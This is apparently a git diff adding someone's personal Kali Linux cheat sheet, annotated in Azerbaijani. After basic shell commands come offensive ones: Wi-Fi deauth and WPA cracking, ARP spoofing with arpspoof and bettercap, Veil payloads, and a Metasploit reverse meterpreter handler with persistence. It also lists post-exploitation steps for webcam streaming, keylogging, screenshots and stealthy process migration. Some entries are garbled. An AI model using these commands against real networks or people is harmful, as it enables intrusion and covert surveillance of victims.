@@ -1,0 +1,167 @@
+/etc/hostname ~  hostname olan qovluq
+setxkbmap     ~  change keyboard language
+pwd           ~  print working directory
+ls            ~  içərisində olduğun qovluğun tərkibini göstərir
+ls ~la        ~  gizli sənədlərlə birlikdə və daha geniş göstərir
+cd            ~  change directory
+mkdir	      ~  make directory
+clear         ~  terminalın ekranını təmizləyir
+cd ../        ~  bir qovluq geri gedir
+touch         ~  sənəd yaradır (uzantı)
+cp            ~  copy
+mv            ~  move
+rm            ~  remove
+sudo su       ~  switch user(root)
+exit          ~  rootdan və ya daxil olduğumuz sistemdən çıxış
+cat           ~  sənədin tərkibini göstərir
+nano          ~  sənəddə dəyişiklik edir
+ifconfig      ~  şəbəkə haqqında tam məlumat
+iwconfig      ~  wlan0 haqqında geniş məlumat 
+ip addr       ~  şəbəkə haqqında məlumat
+passwd        ~  şifrəni dəyişdirir
+ping          ~  saytın ip sini görsədir
+ctrl+shift+c  ~  copy
+ctrl+shift+v  ~  paste
+ctrl+c        ~  komutu dayandırır(break)
+ctrl+z        ~  komutu arxada işlədir
+ctrl+a        ~  komutun əvvəlinə gedir
+ctrl+e        ~  komutun sonuna gedir
+ctrl+l        ~  ekranı təmizləyir (aşağıda yer açır)
+curled        ~  terminalı bağlayır
+esc+t         ~  son iki sözün yerini dəyişir terminalda
+tab           ~  avtomotik tamamlayır
+chmod 777     ~  bütün icazələri verir
+jobs          ~  arxa planda gedən işləri göstərir
+uname -r      ~  kernel i göstərir  (versiya)
+uname -a      ~  tam məlumat
+lsb_release -a~  tam məlumat(nisbətən az)
+whoami        ~  kimik sistemdə
+
+[10/7/2024 8:10 PM] ＶＵ̈ Ｓ Ａ Ｌ: sudo groupadd vedre
+[10/7/2024 8:10 PM] ＶＵ̈ Ｓ Ａ Ｌ: groups
+[10/7/2024 8:11 PM] ＶＵ̈ Ｓ Ａ Ｌ: sudo usermod -aG vedre vusall
+[10/7/2024 8:11 PM] ＶＵ̈ Ｓ Ａ Ｌ: groups vusall
+[10/7/2024 8:11 PM] ＶＵ̈ Ｓ Ａ Ｌ: sudo gpasswd -d vusall vedre
+[10/7/2024 8:11 PM] ＶＵ̈ Ｓ Ａ Ｌ: sudo userdel -r vusall
+				  sudo groupdel vedre
+
+service apache2 start
+
+systemctl start tor    
+tornet --interval 3 --count 0
+
+
+python3 -m venv myenv
+source myenv/bin/activate
+
+
+
+cat /etc/resolv.conf	~  DNS i göstərir
+chattr                  ~ root un eləmidiyini eləməyi sağlyır
+
+netdiscover -i eth0 -r 10.0.2.0/24 -c 100
+
+
+
+RHOST  	~  bura qarşı tərəfin ip yazılır
+LHOST  	~  bura giriş edənin ip yazılır
+
+
+reverse_port     reverse seçmək lazımdı
+bind_port        bind seçmək arzu olunmazdı
+
+meterpreter \\ qarşı tərəf üzərində çox şeylər edə bilir ~help vasitəsi ilə bunları görə bilərik
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+terminal açılan zaman avto yazıların yazılması (hət terminal üçün ayrı edilməlidir):
+figlet -f slant -c "xxx" | lolcat
+yuxarıdaki sətri müvafiq olaraq ~/.zshrc -da boş sətrə yazırıq.
+showfigfonts yuxarıdaki slant tipli görünüşlərin listini göstərir
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+nmap()
+-sT	~ tcp ləri tap (ilk 1000)
+-sU	~ udp ləri tap (ilk 1000)
+-T5	~ 0-dan 5 ə qədər scan ın sürətini artırır. T4 və T5 şəbəkə xaricində istifadə olunmamalıdı. T yazılmasa susmaya görə nmap T3 ilə işləyir
+-O	~ Əməliyyat sistemini müəyyən et
+-sV	~ protları versionları ilə birlikdə tap(-sU və -sT ilə birgə işlədilir)
+-A	~ bütün hamısını bir koda icra edir (ilk 1000)
+-p-	~ 65536 portun hamısını scan edir
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+macchanger --random wlan0                                      ~ mac ardresini random olaraq dəyişir
+ifconfig wlan0 down                                            ~ şəbəkə ilə əlaqəni kəsir
+ifconfig wlan0 up	                                       ~ şəbəkə ilə əlaqəni yenidən bərpa edir
+ifconfig wlan0 hw ether	                                       ~ özümüz mac təyin edirik (məs:  00:00:11:11:00:00)
+service NetworkManager restart                                 ~ sıfırlayır cari parametrləri
+airmon-ng start wlan0                                          ~ monitor moduna keçiş edir
+airmon-ng stop  wlan0mon                                       ~ monitor moddan çıxış 
+airodump-ng wlan0mon                                           ~ ətrafdaki şəbəkələr haqqında məlumat
+airodump-ng --channel xxx --bssid xxx --write xxx wlan0mon     ~ göstərilmiş bssid haqqında məlumat
+aireplay-ng --deauth 10000 -a bssid -c mac wlan0mon            ~ deauth attack
+aircrack-ng  (dosya)                                           ~ wep şifrəsi qırmaq
+aireplay-ng --fakeauth 0 -a bssid -h mac  wlan0mon             ~ öz mac imizi içəri salmaq
+aireplay-ng --arpreplay 0 -b bssid -h mac  wlan0mon            ~ həmin mac ilə saxta iş görmək
+crunch min max xxxx -o (dosya)                                 ~ wordlist yaradır
+aircrack-ng (dosya main) -w (dosya wordlist)                   ~ wpa attack
+wash -i wlan0mon                                               ~ wps 
+airbase-ng
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Pin ilə kalidə wifi a bağlanmaq()
+wpa_cli
+wps_pin (bssid) (pin)
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Arpspoof ilə Arp atack()
+apt install dsniff    			 ~ arpspoof yükləyir
+arpspoof -i eth0 -t (modem) (client)     ~ arpspoof'un istifadəsi
+arpspoof -i eth0 -t (client)(modem)        iksi də eyni anda işləməlidi
+echo 1 > /proc/sys/net/ipv4/ip_forward   ~ yuxarıradki komutlardan əvvəl işlədilməlidi
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+bettercap ilə arp atack()
+bettercap -iface eth0
+net.probe on
+net.show
+help arp.spoof
+set arp.spoof.fullduplex true
+set arp.spoof.internal ture
+set arp.spoof.targets (hədəf ip(lər))
+arp.spoof on
+net.sniff on
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Veil yüklənməsi və multi handler()
+sudo apt-get -y install git
+git clone https://github.com/Veil-Framework/Veil.git
+cd Veil/
+./config/setup.sh --force --silent
+generate
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_http
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+#!/usr/bin/python3  ~ python istifadə edilməsini təyin edir
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+&> /dev/null&                  ~  ekrana gələnlərin boşluğa getməsi
+~~Bizə əməliyyat kodu verir~~
+jobs                           ~  arxa planda gedən işləri göstərir
+kill (Əməliyyat kodu)          ~  arxa planda gedən əməliiyatı dayandırır
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+MSFCONSOLE()
+
+msfconsole                    		 ~ programı işə salır
+use exploit/multi/handler     		 ~ Multi handler i işə salır
+use exploit/windows/local/persistence
+show advanced
+show options                 		 ~ parametrləri göstərir
+set payload                   		 ~ payload u təyin edir
+set exe::custom /var/www                 ~ backdoor umuzu yerləşdirir
+sessions -l                  		 ~ mümkün sessions ları göstərir
+background                   	         ~ sessions dan əlaqəni kəsmədən işə davam
+sysinfo                      	         ~ açıq olan sessions dakı pc haqqında 
+webcam_stream                		 ~ sessions daki pc nin kamerasını açır
+keyscan_start                 		 ~ sessions daki pc ni izləməyə başlayır
+keyscan_dump                		 ~ qeyd ediən hər addımı göstərir
+screenshot                   		 ~ sessions daki pc nin ss ini alır
+ps                           		 ~ sessions daki pc də gedən proseslər
+migrate (id)                 		 ~ girşimizi həmin id ə köçürür(gizlilik üçün)
+pwd                          		 ~ print working directory
+upload                       		 ~ sessions daki pc ə yükləmək
+download                     		 ~ sessions daki pc dən yükləmək
+cat                          		 ~ sənədin tərkibini göstərir
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
